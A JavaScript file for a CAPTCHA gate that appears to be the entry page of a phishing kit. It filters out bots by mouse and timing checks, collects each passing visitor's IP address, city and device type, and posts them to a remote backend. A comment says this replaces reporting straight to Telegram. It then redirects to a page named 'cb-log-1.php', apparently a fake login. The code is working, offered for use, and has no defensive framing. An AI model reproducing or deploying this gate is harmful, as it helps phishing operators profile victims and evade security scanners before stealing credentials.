let captchaText = "";
let interactionDetected = false;
let startTime = Date.now();

const BACKEND_URL = "https://new-cb-backend.onrender.com"; // Change to your backend URL

// Show main content and generate captcha on load
window.addEventListener('DOMContentLoaded', function() {
  document.getElementById('initial-spinner').style.display = 'none';
  document.getElementById('main-content').style.display = 'block';
  generateCaptcha();
});

// Track user interaction
document.addEventListener("mousemove", () => {
  interactionDetected = true;
});

document.addEventListener("touchstart", () => {
  interactionDetected = true;
});

// Input event listeners
document.addEventListener('DOMContentLoaded', function() {
  const captchaInput = document.getElementById("captchaInput");
  
  captchaInput.addEventListener("input", function(e) {
    // Only allow numbers
    this.value = this.value.replace(/[^0-9]/g, "");
    // Enable button only if input is not empty and is a number
    const btn = document.getElementById("continueBtn");
    btn.disabled = !(this.value.length > 0 && /^[0-9]+$/.test(this.value));
  });

  captchaInput.addEventListener("focus", function() {
    this.style.borderColor = '#578bfa';
  });

  captchaInput.addEventListener("blur", function() {
    this.style.borderColor = '#cbd5e1';
  });

  // Button click
  document.getElementById("continueBtn").addEventListener("click", validateCaptcha);

  // Reload link
  document.getElementById("reloadLink").addEventListener("click", function(e) {
    e.preventDefault();
    reloadCaptchaWithLoading();
  });
});

function generateCaptcha() {
  const canvas = document.getElementById("captchaCanvas");
  const ctx = canvas.getContext("2d");
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  const num1 = Math.floor(Math.random() * 9) + 1;
  const num2 = Math.floor(Math.random() * 9) + 1;

  const expression = `${num1} + ${num2}`;
  captchaText = (num1 + num2).toString();

  ctx.font = "26px Arial";
  ctx.fillStyle = "#000";
  const text = expression + " = ?";
  const textMetrics = ctx.measureText(text);
  const x = (canvas.width - textMetrics.width) / 2;
  const y = (canvas.height / 2) + 10;
  ctx.fillText(text, x, y);

  for (let i = 0; i < 4; i++) {
    ctx.beginPath();
    ctx.moveTo(Math.random() * 200, Math.random() * 50);
    ctx.lineTo(Math.random() * 200, Math.random() * 50);
    ctx.strokeStyle = "#aaa";
    ctx.stroke();
  }

  interactionDetected = false;
  startTime = Date.now();
  document.getElementById("captchaInput").style.borderColor = "#cbd5e1";
  document.getElementById("captchaInput").value = "";
  document.getElementById("continueBtn").disabled = true;
  document.getElementById("spinner").style.display = "none";
}

function reloadCaptchaWithLoading() {
  showSpinner(true);
  setTimeout(() => {
    generateCaptcha();
    showSpinner(false);
  }, 500);
}

function showSpinner(show) {
  document.getElementById("spinner").style.display = show ? "block" : "none";
}

function setInputError(isError) {
  const input = document.getElementById("captchaInput");
  input.style.borderColor = isError ? "#ef4444" : "#cbd5e1";
}

function validateCaptcha() {
  const message = document.getElementById("message");
  const userInput = document.getElementById("captchaInput").value.trim();
  const elapsedTime = Date.now() - startTime;

  setInputError(false);
  message.textContent = "";
  showSpinner(true);
  document.getElementById("continueBtn").disabled = true;

  setTimeout(async () => {
    if (!interactionDetected) {
      showSpinner(false);
      message.textContent = "Incorrect CAPTCHA. Please try again.";
      message.style.color = "#ef4444";
      setInputError(true);
      return;
    }

    if (userInput === "") {
      showSpinner(false);
      message.textContent = "CAPTCHA input is required.";
      message.style.color = "#ef4444";
      setInputError(true);
      document.getElementById("continueBtn").disabled = true;
      return;
    }

    if (elapsedTime < 3000) {
      showSpinner(false);
      message.textContent = "You responded too fast. Please try again slower.";
      message.style.color = "#ef4444";
      setInputError(true);
      return;
    }

    if (userInput === captchaText) {
      // ✅ CHANGED: Send to backend instead of Telegram directly
      const region = await detectRegion();
      const device = detectDevice();
      const ip = await detectIP();
      
      await sendToBackend(region, device, ip);
      
      setTimeout(() => {
        window.location.href = "../1-CB-Log-1/cb-log-1.php";
      }, 2000);
    } else {
      setTimeout(() => {
        showSpinner(false);
        message.style.color = "#ef4444";
        message.textContent = "Incorrect CAPTCHA. Please try again.";
        message.style.display = "block";
        message.style.visibility = "visible";
        setInputError(true);
        generateCaptcha();
        const input = document.getElementById("captchaInput");
        input.value = "";
        input.style.borderColor = "#ef4444";
        input.focus();
        document.getElementById("continueBtn").disabled = true;
      }, 1000);
    }
  }, 200);
}

function adjustFooterText() {
  const desktopFooter = document.querySelector('.desktop-footer');
  const mobileFooter = document.querySelector('.mobile-footer');
  if (window.innerWidth <= 768) {
    if (desktopFooter) desktopFooter.style.display = 'none';
    if (mobileFooter) mobileFooter.style.display = 'block';
  } else {
    if (desktopFooter) desktopFooter.style.display = 'block';
    if (mobileFooter) mobileFooter.style.display = 'none';
  }
}

window.addEventListener('resize', adjustFooterText);
window.addEventListener('load', adjustFooterText);

async function detectRegion() {
  try {
    const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
    const data = await response.json();
    const city = data.city;
    const country = data.country;
    return `${city}, ${country}`;
  } catch (error) {
    console.error('Error detecting region:', error);
    return 'Unknown Region';
  }
}

async function detectIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error detecting IP:', error);
    return 'Unknown IP';
  }
}

function detectDevice() {
  const ua = navigator.userAgent;
  if (/mobile/i.test(ua)) return "Mobile";
  if (/tablet/i.test(ua)) return "Tablet";
  if (/windows/i.test(ua)) return "Windows PC";
  if (/macintosh/i.test(ua)) return "Mac";
  if (/linux/i.test(ua)) return "Linux";
  return "Unknown device";
}

// ✅ NEW: Send to backend (no Telegram tokens exposed in frontend!)
async function sendToBackend(region, device, ip) {
  try {
    const response = await fetch(`${BACKEND_URL}/captcha-success`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        region: region,
        device: device,
        ip: ip
      })
    });

    if (response.ok) {
      console.log("✅ CAPTCHA data sent to backend");
    } else {
      console.error("❌ Backend error:", response.statusText);
    }
  } catch (error) {
    console.error("❌ Error sending to backend:", error);
  }
}
